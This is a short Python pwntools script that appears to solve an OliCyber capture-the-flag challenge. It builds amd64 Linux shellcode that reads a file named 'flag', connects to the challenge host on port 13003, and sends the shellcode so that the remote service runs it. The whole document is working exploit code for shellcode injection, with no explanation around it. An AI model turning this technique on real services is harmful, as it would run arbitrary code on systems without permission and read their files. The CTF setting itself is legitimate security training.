#!/usr/bin/env python3

from pwn import *

asm_code = shellcraft.amd64.linux.cat("flag")
shellcode = asm(asm_code, arch='x86_64')

HOST = "software-20.challs.olicyber.it"
PORT = 13003
r = remote(HOST, PORT)

print(r.recv(1024).decode())
r.send("a".encode())

print(r.recvuntil("(max 4096):").decode())
r.sendline(str(len(shellcode)))

print(r.recvuntil("bytes:").decode())
r.sendline(shellcode)

print(r.recvline().decode())
print(r.recvline().decode())
